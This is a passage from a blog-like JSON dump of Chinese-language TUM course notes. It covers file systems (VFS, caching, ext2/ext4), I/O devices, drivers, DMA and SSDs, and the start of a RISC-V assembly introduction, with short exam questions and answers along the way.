还有一个办法也可以提高文件系统的可靠性（Erhöhung der Zuverlässigkeit）：把多个操作包装成一个原子事务（atomaren Transaktion，即 ganz oder gar nicht）。 虚拟文件系统（Virtual File System，VFS）为了系统的兼容性需求（不同的操作系统和设备可能使用不同的文件系统格式）以及多样化的应用场景，一般的操作系统都会支持多种文件系统。 比如在 Windows 下，可以同时有 NTFS、FAT32、CD-ROM 等文件系统。 Windows会将每个文件系统会被分配一个独立的盘符（如 C:、D:），而类 Unix 系统则是将所有文件系统整合到一个统一的层级结构中，对用户完全透明。 Unix的这个整合是便通过虚拟文件系统（Virtual File System，VFS）实现的。 VFS负责提供一个（遵循 POSIX 标准的）统一的接口（比如 open、read、write、lseek等），用于支持在一个本地系统中接入多种不同的文件系统。 图示： 优化策略（Optimierung）Buffer Cache（缓冲区缓存）（这部分ERA的Cache那一章会详细讲。） 文件系统使用内存中的一部分作为缓存区域，来暂存磁盘上的数据块。 对于读的操作的处理流程： 先检查所需的数据块是否已经在缓存中？如果是，就跳到步骤3 如果不在缓存中：就从磁盘读取这个块，并加载到缓存中 返回这个数据块的内容给调用者（用户进程） 当缓存空间不够时也需要替换策略（Ersetzungsstrategie）。 进行写的操作时数据会先写入缓存区，不一定立刻写入磁盘。在Unix中可以使用 sync 命令手动将缓存区内容写入磁盘，不过系统自己也会会周期性自动执行（例如每30秒由 update 守护进程（daemon）完成）。Windows采用的则是 Write-thru Cache，即写操作会立即同步到磁盘。 预读（Read-Ahead）预读指的是提前把即将需要的数据块加载到缓存中，以此来提高读取性能。 可以 简单预测，或者 即假设用户会按顺序进行读取，比如说在用户请求读取某个文件的第 k 块时，就先检查第 k+1 块是否已在缓存中。如果不在缓存，就提前加载第 k+1 块。 结合结合文件的访问历史进行预测 给文件设置一个属性，记录它是否是被顺序读取。如果确认是顺序访问，才启用 Read-Ahead。 减少磁盘读写头的移动 尽量让同一文件的块物理上靠得更近 比如存储在同一个磁柱（Zylinder）上的Blöcken里。 块组分配（Verwaltung von Blöcken in Gruppen） 不按单个块分配，而是每次分配2个或4个块。这样可以隐式地提高局部性（Lokalität）。 i-node 结构不要都集中在分区开头（i-nodes nicht (nur) am Anfang der Partition） 碎片整理（Defragmentierung）将文件的所有块重新排列，使它们尽可能连续，提高访问效率。（Neugruppierung der Blöcke der Dateien auf der Festplatte） 例子Linux的ext2ext2会将硬盘分区划分为“块组”结构（Aufteilung der Festplatten-Partition in Block-Gruppen）。 Block 0 是预留给系统启动用的（System-Bootup-Vorgang）。 而其余的所有Block-Gruppen都包含以下信息： 超级块（Superblock）： 包含有关文件系统布局的信息，比如说 i-node和数据块的总数、空闲块列表的指针等。 （Anzahl der i-nodes und Blöcke, Pointer zur Liste mit freien Blöcken, etc.） 组描述符表（Gruppen-Deskriptor-Tabelle）： 包含这个块组的信息，比如说Bitmap的位置、空闲的 i-node 和数据块的数量、目录的数量等。 （Position der Bitmaps, Anzahl freie i-nodes und Blöcke, Anzahl der Verzeichnisse） 两个位图（Bitmaps）： 每个Bitmap都是一个Block的大小，记录空闲块以及 i-nodes。通过这个Bitmap可以找到空闲的块以及i-nodes。 i-nodes Datenblöcke （这些Block groups都是ext2管理的空间） ext2中打开文件时，系统会在目录里查找该文件的i-node信息： 首先从目录条目（Verzeichniseintrag）中获取 i-node 编号（i-node-Nummer），通过该编号可以在硬盘上的 i-node 表中找到该文件的 i-node，并将其加载到内存中。 然后 i-node 会被写入内存中的 i-node 表。 i-node 表包含了所有已打开的文件和目录的 i-nodes。 目录文件结构图示： Linux的ext4ext4则是在ext2的基础上加了 journaling 日志机制。这里的日志是一个文件，它会通过一个环形缓冲区（ring buffer）来实现。日志由一个独立于文件系统的层管理，叫做 Journaling Block Device（JBD）。 JBD中支持以下几种数据结构： 日志记录（Log-Eintrag (Log Record)） 描述低等级的修改操作。 Beschreibt eine Low-level-Dateisystem-Operation, die einen Block modifiziert. 原子操作句柄（Atomic Operation Handle） 会将一组相关的日志记录组合在一起，并原子性地执行。（Gruppiert mehrere zusammengehörige Log-Einträge und führt sie atomar aus） 比如说 write 一般会涉及修改i-node、数据块、空闲块列表等信息，而这些操作应当作为一个整体 原子性执行（atomar als Einheit ausgeführt werden）。 事务（Transaktionen） JBD会将多个原子操作作为事务处理。一组日志记录只有在相关的所有实际写入操作都完成后，才能从日志中移除。 （这些内容在之前的日志文件系统（Journaling-Dateisysteme）都讲过，跟Datenbank里的也差不多。） ext4同样改进了将块映射到文件的方式：在ext2/3中都是使用指针指向单个块（Direkte und ein-/zwei-/dreifach indirekte Blöcke），这样一来如果块的数量过多可能会导致指针数量也过多。所以ext4采用的是Extents： Instead of storing a list of every individual block which makes up the file, the idea is to store just the address of the first and last block of each continuous range of blocks. These continuous ranges of data blocks (and the pairs of numbers which represent them) are called extents. （这段解释是这里来的：https://unix.stackexchange.com/questions/223310/what-do-extents-feature-do-in-ext4-filesystem-in-linux） 图示：","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/en/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/en/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/en/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"文件系统","slug":"文件系统","permalink":"https://archer-baiyi.github.io/en/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}]},{"title":"GBS 8 Ein/Ausgabe 输入/输出","slug":"TUM info 笔记/GBS/GBS-8-Ein-Ausgabe-输入输出","date":"2025-03-20T19:20:11.000Z","updated":"2025-04-26T18:31:15.252Z","comments":true,"path":"2025/03/20/TUM info 笔记/GBS/GBS-8-Ein-Ausgabe-输入输出/","permalink":"https://archer-baiyi.github.io/en/2025/03/20/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-8-Ein-Ausgabe-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/","excerpt":"操作系统基础相关笔记","text":"设备大致可以分为2类： 块设备（Blockorientierte Geräte，block devices）： 内容是可寻址的（adressierbar）； 数据以固定大小的块存储（in Blöcken fester Größe von 29 Byte bis 216 Byte）； 可以随机访问（Random Access）每个块； 例子：蓝光光盘（Blu-ray Disc）、硬盘（HDD）、固态硬盘（SSD）。 字符设备（Zeichenorientierte Geräte，character device）： 串行数据传输（serieller Datentransfer）：指每次传输一个比特数据，并连续进行以上单次过程的通信方式； 不可寻址的； 发送和/或接收字符流（Zeichenströme）； 例子：鼠标，键盘，打印机。 （其他）： 比如说时钟（生成中断信号 erzeugt Unterbrechungen），显示器等。 拿键盘举例，我们每次敲击按键了之后它都会将这个信息直接传输到电脑，而不是等我们输入了一长串内容之后再将这段内容一起发送给电脑，所以是serieller Datentransfer。而与serieller Datentransfer相对的则是parallele Datenübertragung。 E/A System 的分层结构： 控制器（Controller）：设备硬件的一部分；作为CPU和设备之间的接口。 中断处理程序（Interrupt-Handler）：处理设备的反馈信息（中断）。 设备驱动程序（Gerätetreiber）：执行与设备相关的控制软件；驱动程序通过控制器访问设备。 设备无关软件（Geräteunabhängige Software）：分配设备、数据缓冲等功能。 用户级软件（User-Level-Software）：用于输入/输出（E/A）的库函数，例如假脱机（Spooling）。 以惠普（HP）打印机为例来明确一下每层的具体内容： 控制器：HP 打印机的主控制芯片 惠普打印机内部有专门的 控制芯片，负责管理打印作业、处理数据，并控制墨盒或激光成像单元的工作。 中断处理程序：负责处理打印机状态反馈（如“缺纸”或“墨盒不足”）的程序 当打印机遇到 缺纸、卡纸、墨水不足 等问题时，会发送中断信号给计算机，让操作系统暂停当前任务并处理异常。 设备驱动程序：HP 打印机驱动程序 点击“打印”时，驱动程序会把文本或图像转换成 HP 打印机能理解的格式（如 PCL、PostScript），然后发送给打印机。 设备无关软件：Windows/Linux 的打印管理系统 这层软件不依赖于具体的打印机品牌，而是为所有打印设备提供统一的管理功能，如： 排队管理（多个打印任务排队执行） 数据缓冲（避免 CPU 直接等待打印机完成任务，提高效率） 用户级软件：用户直接使用的应用程序，它们调用系统级打印服务完成任务。例如：Microsoft Word，HP Smart App。 接下来我们看一下每一层的具体功能： 控制器（Controller）什么是控制器？ 输入/输出设备（E/A-Geräte） 由机械组件和电子组件组成，其中电子组件就是设设备控制器（Geräte-Controller）。它是连接 CPU 和外部设备的桥梁。 Controller besitzt Hardware-Schnittstelle zum Gerät. 控制器包含寄存器（Register），用于与 CPU 进行通信： 数据传输：操作系统（BS）向寄存器写入数据。 查询设备状态：操作系统 读取寄存器内容。 附加功能：控制器提供数据缓冲区（Datenpuffer），用于存储传输中的数据，以提高效率。 设备控制器（Geräte-Controller）的主要任务： 设备管理（Steuerung der beweglichen Hardware） 处理来自驱动的命令（Befehle ausführen） 与CPU进行交互（Kommunikation mit CPU） 发送中断信号（Interrupts melden） 缓冲数据（Daten puffern） 交互计算机与设备控制器（Controller）交互主要有两种方式： I/O-Ports： 早期计算机使用 I/O 指令和I/O 端口与设备通信。 Memory-Mapped I/O： 将设备的寄存器直接映射到系统内存地址空间，这样 CPU 可以通过普通的 LOAD/STORE 指令来访问设备。 早期的计算机需要手动设置设备地址，使用 跳线（Jumper） 或 DIP 开关。而现代设备支持 Plug &amp; Play，系统能够自动分配 I/O 端口地址 和 中断（IRQ）。 数据交换第一种方法： 程序控制 I/O（Programmed I/O）CPU会直接控制与设备的交互。 比如说向打印机发送数据需要进行以下步骤： 将数据复制到内核 内核逐个字符发送到打印机 传输字符 $N$ 等待打印机确认字符 $N$ 继续发送字符 $N+1$ 这样做的坏处非常显而易见：忙等待（Busy Waiting）。CPU会被卡死在这里不能完成其他的任务。 代码示例： 12345copy_from_user(buffer, p, count)for (i = 0; i &lt; count; i++) &#123; while (*printer_status_reg != READY); // 忙等待 *printer_data_register = p[i]; // 只发送一个字符&#125; 更好的办法： 中断（Interrupts）流程如下： 设备通过信号通知CPU，表明其I/O操作已完成。 中断控制器（Interrupt Controller Chip）识别信号，并通知CPU。 操作系统（BS）暂停当前进程，切换到内核模式（Kernel Mode）。 在内核中执行中断处理程序（Unterbrechungsbehandlungsroutine） 设备驱动程序（Gerätetreiber）负责提供中断处理程序（Unterbrechungsbehandlungsroutine），但中断处理的执行由操作系统管理。 中断处理程序（Handler） 执行完成后便会通知操作系统。 操作系统将等待（wartenden）I/O 的进程恢复到可运行状态（rechenwillig）。 这个流程可以分为2部分： 同步系统调用（Systemcall） 传递 I/O 参数，启动 I/O 操作。 调用后，进程进入睡眠状态（等待 I/O 完成），释放 CPU。 Interrupt-Handler 逐步处理 I/O 操作。 I/O 完成后，唤醒等待的进程。 代码示例： 1. Systemcall： 12345copy_from_user(buffer, p, count); // 从用户空间复制数据到内核enable_interrupts(); // 允许中断while (*printer_status_reg != READY); // 轮询等待打印机准备就绪*printer_data_register = p[0]; // 发送第一个字符到打印机scheduler(); // 调度其他进程 2. Interrupt-Handler： 123456789if (count == 0) &#123; unblock_user(); // 唤醒等待的进程&#125; else &#123; *printer_data_register = p[i]; // 发送下一个字符 count = count - 1; i = i + 1;&#125;acknowledge_interrupt(); // 确认中断已处理return_from_interrupt(); 用这个方法的话CPU 可在 I/O 期间执行其他任务，不需要一直等待。但是会一直触发Interrupt，可能会影响性能。 所以此之上还有一种更好的办法： 直接内存访问（Direct Memory Access, DMA）使用 DMA 控制器，允许直接访问内存，而无需 CPU 介入。可以有效解决通过寄存器作为中间存储器传输数据消耗大量 CPU 计算周期的问题。 传输流程： CPU 初始化 DMA （Programmiert DMA-Register (Speicher- und Gerätadressen, Parameter)）； 磁盘控制器（ Disk-Controller）将数据放入缓冲区（Puffer）； DMA 控制器从磁盘（Disk）读取数据，并直接存入主存（RAM）（DMA-Controller initiiert die Übertragung von Disk in RAM）； 磁盘控制器（ Disk-Controller）发送确认（ACK）。 操作系统（BS）继续处理内存中的数据（ weiterverarbeiten bzw. weitergeben） 流程结束之后才会发送Interrupt。 之前是传输每个数据（每个字符）都会触发一次Interrupt，现在是传输整个数据块只会触发一次。 数据缓冲（Puffern von Daten）缓冲的主要作用是解耦（Entkopplung）用户程序和设备。相当于提供一个中间层。 （解耦指的是减少两个系统组件之间的直接依赖关系。） 缓存分以下几种类型： 无缓冲（Ohne Puffer）： 用户进程必须自己存储 I/O 数据，并且数据必须始终驻留在进程的内存中，直到 I/O 操作完成。 简单缓冲（Einfacher Puffer）： 进程仍然必须快速取走数据，否则缓冲区会满，影响数据流。 双缓冲（Doppelter Puffer）： 一个缓冲区正在被读取（geleert）的同时另一个缓冲区会正在被写入（gefüllt）。清空速度必须足够快，否则会导致数据堆积。 环形缓冲（Zirkulär / Ringpuffer）： 扩展双缓冲的概念，使用多个缓冲区（k 个缓冲区）。可以适应不同的负载和处理速度，提高数据吞吐率。 会使用2个指针来管理数据：写指针和读指针。 有时可能会存在多个级别的缓冲，比如说：Nutzerprozess, Kern, Gerätetreiber, Gerätecontroller, … 设备驱动程序（Geräte-Treiber）设备驱动程序（Geräte-Treiber，Device Driver） 是操作系统中用于控制硬件设备的软件模块（Software-Module）。它充当 BS 和设备（尤其是Controller）之间的桥梁，让系统能够识别和管理外部设备。 驱动具有以下特点： 针对特定设备类型（Gerätetyp-spezifisch） 它了解相应设备的指令集（即控制设备的命令），以便和controller进行交互。 一个驱动程序可适用于多个同类设备 比如说USB驱动会支持所有的USB设备。 驱动充当BS 和设备（尤其是Controller）之间的桥梁指的是它可以： 查询设备状态（Gerätezustand abfragen） 向设备发送命令（Befehle an das Gerät zu übermitteln） 与设备进行数据交换（Daten mit dem Gerät auszutauschen） 同样，驱动也可能存在子结构（Unterstruktur），比如说USB。 驱动的主要任务： 定义设备并向操作系统注册，并激活设备。（definiert das Gerät gegenüber dem BS, aktiviert das Gerät） 在系统启动时初始化控制器和设备。（initialisiert den Controller und das Gerät beim Systemstart） 转换I/O 请求，使其变为设备可理解的指令。（wandelt E/A-Anforderungen in gerätespezifische Befehle um） 响应（来自设备或控制器的）硬件信号。（antwortet auf Hardwaresignale des Geräts bzw. des Controllers）（比如说 Interrupt handling） 报告设备和控制器的错误（错误检测和日志记录）。（meldet Geräte- und Controller-Fehler） 传输设备与操作系统之间的数据和状态信息。（überträgt Daten und Zustandsinformation vom/zum Gerät） 缓冲输入/输出数据，优化数据传输性能。（提供Buffer）（puffert Daten bei Ein- und Ausgabe） 设备驱动是如何与设备控制器协作的？ 驱动程序发送命令到设备控制器，并在等待期间阻塞自身（防止 CPU 过度轮询）。（Treiber schickt Kommandos zum Controller und blockiert sich） 控制器处理数据并在传输完成后发送信号（通知数据交换已完成）。（Controller signalisiert das Ende des Datenaustausches） 中断处理程序（Interrupt-Handler）解除驱动的阻塞状态，例如通过信号量（Semaphore） 让进程恢复运行。（Der Interrupt-Handler entsperrt den Treiber (z.B. Semaphore)） 驱动程序处理收到的数据或继续发送新数据。（Treiber verarbeitet empfangene Daten bzw. schickt weitere Daten） 设备无关的软件（Geräte-unabhängige Software）设备无关的软件的目的是简化驱动程序的编程（Vereinfachte Treiber-Programmierung），并便于集成新的驱动程序软件（Einfache Einbindung neuer Treiber-Software）。 设备无关软件的主要任务： 在设备驱动程序和操作系统之间建立标准接口。（Bereitstellung einer einheitlichen Schnittstelle zwischen Gerätetreibern und dem Rest des Betriebssystems） 缓冲 如果缓冲不由驱动管理，则由设备无关的软件负责。 错误处理（Fehlerbehandlung） 除了驱动程序本身的错误处理外，还提供额外的错误管理机制。 设置设备无关的参数（Festlegung geräteunabhängiger Parameter） 比如说块设备（Blockgerät）使用的块大小（Blockgröße） 用户级软件（User-Level-Software）系统库（Systembibliothek）通常会直接给用户提供E/A的编程接口。 比如说： open()： 打开设备的逻辑通道，返回一个 文件描述符（Descriptor 或 Handle），供后续操作使用。 read()： 从设备读取数据，返回指定数量的字节流（Bytestream）。 close()： 关闭先前打开的通道，释放相关的系统资源。 write()： 向设备写入数据，发送指定数量的字节到设备。 ioctl()： 改变设备的操作模式，比如调整串行端口的传输速率或者是修改设备的控制参数 除了这些标准库函数，还有： 假脱机（Spooling）由于在现实生活中，我们经常会有多个进程同时提交I/O请求，比如说用一台打印机打印多份文件。这个时候就需要想办法协调资源的使用，避免出现冲突。 什么是 Spooling？ Spooling（Simultaneous Peripheral Operations Online，同步外设操作） 是一种用于管理独占（）exklusiv nutzbar)设备（如打印机）访问的缓冲机制。 在这个机制下，进程不会直接访问设备，而是将任务交给 Spooler Daemon（假脱机守护进程） 处理。只有 Spooler Daemon 会直接与设备驱动程序交互，确保设备顺序执行任务。用户进程的任务先存入 Spooling 目录（缓冲区），然后按顺序执行。 UNIX/Linux里的设备管理在UNIX/Linux里，我们需要通过文件系统访问 I/O 设备（因为“Everything is a file”）： 在访问设备前，必须先打开它 open。 不同设备支持额外的文件系统操作，如读写、状态查询等。 设备管理位于 /dev 目录，所有设备文件都存放在这里。 设备状态查询和配置可能位于 /proc 目录。 设备文件名称指示设备类型，比如说： /dev/tty0：物理串行接口（终端）。 /dev/USBtty1：抽象串行接口（USB 串口设备）。 /dev/sd0：硬盘设备（sd 代表 SCSI 磁盘）。 /dev/null：伪设备，写入的数据会被丢弃。 /dev/zero：伪设备，读取时返回无限的 0 字节。 Spooling 任务存储在 /var/spool 目录下，其中 lpq：打印任务队列（打印机 Spooling）。 mqueue：邮件服务器的发送队列（邮件 Spooling）。 news：新闻系统消息队列（新闻 Spooling）。 cron：定时任务执行队列（任务调度 Spooling）。 而设备的真正标识存储在 i-Node 中。i-Node会包含： 主设备号（Major Device Number）：标识设备驱动程序（决定设备的驱动）。 次设备号（Minor Device Number）：要访问的具体设备。 设备例子（机械）硬盘（Festplatten，HDD）机械硬盘属于Block-Gerät，有着以下构造： 同心圆柱（Konzentrische Zylinder） 堆叠的磁盘盘片（Platten, k 层），每张盘片的两面都可以读写（2k 面）。 每张盘片上有多个磁道（Tracks），磁道的编号取决于 圆柱、盘片和面（Track = f(Zylinder, Platte, Seite)）。 每个磁道由多个扇区（Sektoren）组成，每个扇区大小为 512 字节。不过靠近磁盘中心的区域可能有更少的扇区（由于圆周较小）。 机械读写磁头（Schreib-/Leseköpfe），每个盘片有两个读写磁头（上下各一个），总数为 2k。 构造图示： 早期会用到3个参数来确定需要读写的具体位置： x Zylindernummer，Radius：确定是哪一个环； y Kopfnummer，Höhe：确定是哪一张盘片的哪一面； z Sektornummer pro Winkel：确定是哪个扇面； 由于早期 BIOS 和文件系统的设计的限制，只能访问有限的区域。 所以现在一般都使用线性逻辑地址（lineare Adressierung logischer Blöcke），即给每个Sector编号（0，1，2，3，…）。 一个Sector里会包含以下信息： 前导信息（Präambel）： 包含同步位、磁道号和扇区号 数据（Daten）： 通常为512字节 错误校正码（ECC）： Error Correcting Code Cylinder Skew: The offset distance from the start of the last track of the previous cylinder so that the head has time to seek from cylinder to cylinder and be at the start of the first track of the new cylinder. Head Skew: The offset distance from the start of the previous track so that the head has time to switch from top of platter to bottom of platter and be at the start of the new track. 控制器通常一次读取整个磁道，这会需要足够的缓存来存储数据。但假如没有足够的缓存，则会采用交错的格式（ Formatierung mit Interleaving）：扇区不会按顺序排列的：1, 2, 3, 4, 5, 6, …, 15，而是交错排列的：1, 4, 7, 10, 13, 2, 5, 8, 11, 14, 3, 6, 9, 12, 15。这样子可以确保读取某个扇区 N ，将数据传输到主存后，扇区 N+1 会刚好移动到读写头下方，不需要再多等一圈。（因为磁盘好像是会一直转的） 为了避免磁盘损坏影响硬盘功能，会使用RAIS-System。（详细内容见数据库的笔记） 读写磁头找到所需Sector的策略分3种： FCFS Shortest Seek First (SSF) Elevator algorithm (Fahrstuhl-Algorithmus) 固态硬盘（SSD）SSD的全称为Solid State Drives，主要基于 (NAND) 闪存。 SSD的一些特点： 无机械部件（Keine beweglichen Teile） 所以不会有机械磨损及其导致的故障，更耐振动、冲击等，访问速度更快。 仍然可能出现故障（Fehlfunktionen auch hier möglich），比如 坏块，存储芯片故障（Bad blocks, Fehler in Speicherchips） 反复读取可能影响相邻存储单元 故障可能导致整个 SSD 无法读取 数据恢复更加复杂 闪存写入次数有限（Flash-Speicher nur begrenzt oft schreibbar） 读取比写入快，顺序（sequentiell）写入比随机写入快 SSD的基本工作原理SSD的初始状态是： 111111111 11111111 11111111 ... 写入的话会将1改成0： 101000111 01000010 01010011 ... 但如果想修改的话，不能只是修改一位，而是需要将这一整块重置然后再写入。 写入的大小最低为4KB，删除的大小最低为256KB，所以会导致所谓的写入放大（Write Amplification）的问题。 解决方式：这部分我没看懂，等看懂了再写。 时钟（Uhr,）时钟会持续性计时。 硬件时钟（Hardware-Uhr (Chip)）的构成： Quarz als Taktgeber： 石英晶体”作为时钟信号源，用来产生稳定的振荡信号（周期性电信号）作为“节拍”。 计数器（Zähler）： 每个时钟节拍到来时，计数器的值会减1（dekrementiert）； 当计数器值减到0时，就会触发一个中断（Interrupt）。 Register zum (wiederholten) Setzen des Zählers auf einen Startwert： 可以通过软件来控制Interrupt的频率。 时钟/定时器的任务： 管理时间和日期（Tageszeit und Datum verwalten） 中断和切换进程（调度）（Prozesse unterbrechen und umschalten (Scheduling)） 测量某个进程的计算时间消耗（Rechenzeitverbrauch eines Prozesses messen） 向应用程序提供定时器功能（ Zeitschaltuhren den Anwendungen zur Verfügung stellen） 功能监控（看门狗定时器）（Funktionsfähigkeitsüberwachung (watchdog timer)） 性能分析、监控、统计（Profiling, Monitoring, Statistik） 可以用链表的数据结构来管理定时事件： 所有时间均为相对时间（relativen Zeiten），也就是说每个节点的值代表相对于前一个事件的延迟（以 tick 为单位）。 定时器（Timer）Timer（定时器）确实通常分为两种类型： 硬件定时器（Hardware Timer）： 系统通常有第二个可编程定时器。它在到时间的时候会触发Interrupt。但Interrupt的代价有点高，因为会引发上下文切换，并且可能会干扰程序正常运行。 软件定时器（Software Timer）： 这个的想法是只在系统处于内核态时检查定时器状态（nur dann aktiv werden, wenn System im Kernel-Mode ist），这样一来就不需要额外的上下文切换。在从内核模式切换到用户模式之前，操作系统读取实时时钟并检查是否有软件定时器已经超时，如有需要，处理相应的事件。 它的缺点也很明显，就是延迟，不过大部分情况下都是可以接受的。 终端（Terminals）终端是如何通过驱动程序将用户输入/输出转化为系统能够理解的数据流的： 上层：提供一个统一接口给操作系统的输入/输出子系统（Einheitliche Schnittstelle zum E/A-Subsystem des BS） 中层：解析输入和构造输出内容（Bearbeitungsmodul für Ein- und Ausgaben） 下层：与不同的物理硬件设备直接对应（Abbildung verschiedene physische Geräte），比如鼠标、显卡。 系统中的 terminal 是一个底层的字符设备机制，管理输入输出流、进程控制和驱动之间的协作。而我们平常用的cmd只是是 terminal的一种表现形式。 例题例题1Welche Implikation hat der heutige Wechsel von HDDs auf SSDs für Betriebssysteme? Freie Blöcke sollten explizit markiert werden Niedrigere Random-Access Latency SSDs haben variable Blockgrößen Exzessives Swapping strapaziert Lebensdauer Erlaubt direkten Zugriff durch Userspace Kein DMA notwendig 答案：1，2，4。 解释： HDD是覆盖写入，所以只要操作系统自己知道哪些块是空的就够了。但SSD是擦除写入，所以需要操作系统明确告诉SSD哪些块是空的它才会去擦除。 SSD 没有机械臂，不需要寻道，所以随机访问（Random Access）非常快，即随机访问延迟更低（Niedrigere Random-Access Latency） SSD有明确的写入次数限制，而HDD只是会老化而已 所有磁盘都需要DMA 例题2 Welche Komponenten werden nicht aktiv, wenn ein Nutzer lokal an seinem Rechner einen Command in ein Terminal im Cooked Mode tippt (ohne Enter zu drücken)? Kernel TLB Tastatur-Treiber Terminal-Emulator Shell-Prozess Systembus 答案：5. 解释：1，2，3，6在系统处理输入的时候都会aktiv。4是终端的程序，提示你输入命令的。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/en/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/en/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/en/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"输入/输出","slug":"输入-输出","permalink":"https://archer-baiyi.github.io/en/tags/%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/"}]},{"title":"RISC-V 汇编语言入门","slug":"TUM info 笔记/ERA/RISC-V-汇编语言入门","date":"2025-03-19T19:56:10.000Z","updated":"2026-02-13T08:40:09.062Z","comments":true,"path":"2025/03/19/TUM info 笔记/ERA/RISC-V-汇编语言入门/","permalink":"https://archer-baiyi.github.io/en/2025/03/19/TUM%20info%20%E7%AC%94%E8%AE%B0/ERA/RISC-V-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8/","excerpt":"计算机体系结构基础相关笔记","text":"下载 RISC-V Simulator QtRvSimQtRvSim是一个由捷克技术大学开发的项目，用来模拟一颗 RISC-V 处理器。 下载链接：https://github.com/cvut/qtrvsim/releases/tag/v0.9.8 Windows选择带有”mingw32”的文件。（比如说 qtrvsim-mingw32-v0.9.8.zip） 选择默认的No pipeline no cache，然后点击Example。 在上半部分可以看到所有寄存器，包括对应的助记符（mnemonics）和值。 左侧可以看到要执行的指令。按照 RISC-V 生态系统的常规约定，程序的指令通常从地址 0x200 开始。 可以通过“Core”和“template.S”这两个选项卡，在处理器视图和源码视图之间切换。 点击“Compile Source and update memory”（向下的蓝色箭头），将当前选中的源代码编译并加载到内存中。 之后可以用Play按钮启动程序。作为示例，终端右侧会输出文本“Hello world.”。（这个运行会持续一段时间，一点一点输出，要有耐心。） RISC-V 寄存器在 RISC-V 中，所有操作数（Operanden）都存储在寄存器中。 RISC-V ISA 拥有 32 或 33 个（可见）寄存器，其中x0永远为零，而x1 到 x31 是通用整数寄存器，f1 到 f31 是 浮点寄存器： Register ABI Name Description Saver x0 zero Hard-wired zero — x1 ra Return address Caller x2 sp Stack pointer Callee x3 gp Global pointer — x4 tp Thread pointer — x5–7 t0–2 Temporaries Caller x8 s0/fp Saved register/frame pointer Callee x9 s1 Saved register Callee x10–11 a0–1 Function arguments/return values Caller x12–17 a2–7 Function arguments Caller x18–27 s2–11 Saved registers Callee x28–31 t3–6 Temporaries Caller Register ABI Name Description Saver f0–7 ft0–7 FP temporaries Caller f8–9 fs0–1 FP saved registers Callee f10–11 fa0–1 FP arguments/return values Caller f12–17 fa2–7 FP arguments Caller f18–27 fs2–11 FP saved registers Callee f28–31 ft8–11 FP temporaries Caller 这里第一列的是每个寄存器的编号，而第二列则是附带语义的名字。一般在汇编代码中使用ABI name，便于理解和维护。 关于Saver部分可以看下面这个表，会更直观一点： Name Meaning Saver Preserved across calls? ra Return address Caller No sp Stack pointer Callee Yes t0 - t6 Temporary registers Caller No s0 - s11 Callee-saved registers Callee Yes a0 - a7 Argument registers Caller No Caller指的是调用函数的一方（比如说main()），而Callee指的则是被调用的函数。 如果一个register的Saver是Caller，则调用函数的一方（Caller）需要在调用函数前将这些寄存器里的值都存储好，以便被调用函数可以随意使用； 如果一个register的Saver是Callee，则被调用函数需要确保这些寄存器的值在该函数结束后与之前一模一样。 通俗一点来讲，前者是将自己的笔记本备份好之后借出去，借用方（Callee）可以随意使用；后者则是将笔记本借出去，但借用方必须确保拿到的时候是什么样子的还回去的时候也得是什么样子的。 RISC-V 汇编语言每一个ISA（Instruction Set Architecture）的指令都可以分为以下3大类： 算术和逻辑运算（Arithmetische und logische Operationen） 数据传输（Datentransfer） 程序控制 （Steuerung des Programmablaufs）：跳转和子程序调用（ Sprünge und Unterprogrammaufrufe） RISC-V 基础汇编指令一览： 算术 Arithmetik加法： a = b + c 1add a,b,c 减法： a = b - c 1sub a,b,c 组合： a = b + c - d 12add t,b,c # t=b+csub a,t,d # a=t-d 浮点数的情况： “F” 拓展用于 Single Precision (32bit) Gleitkomma； “D” 拓展用于 Double Precision (64bit) Gleitkomma。 1234fadd a,b,cfsub a,b,cdadd a,b,cdsub a,b,c 乘法： 注意，乘法以及除法都是需要“M”拓展（M-Erweiterung）的。 乘法相关的操作基本上就是以下几种： 只不过RISC-V 的基本整数指令集中（RV32I 和 RV64I）不包含 mul 指令，乘法运算通常需要 M 扩展（RV32M/RV64M）。如果只允许使用 RV32I/RV64I 指令，则必须通过移位和加法手动实现乘法。 在硬件实现上，移位操作比乘法更快，因为移位仅涉及逻辑电路，而乘法通常需要额外的计算资源。 例子： 假设 $s1 = 0x40000000 = 2^{30}$ $ s2 = 0x80000000 = -2^{31}$ $ s1 * s2 = -2^{61} = 0xE0000000 00000000$ 那么 123mul s3, s1, s2mulh s4, s1, s2# &#123;s4,s3&#125; = s1 * s2 便会得到 $ s4 = 0xE0000000; s3 = 0x00000000$ 除法以及余数： 逻辑运算 Logische Operation和： a = b AND c 1and a,b,c 或： 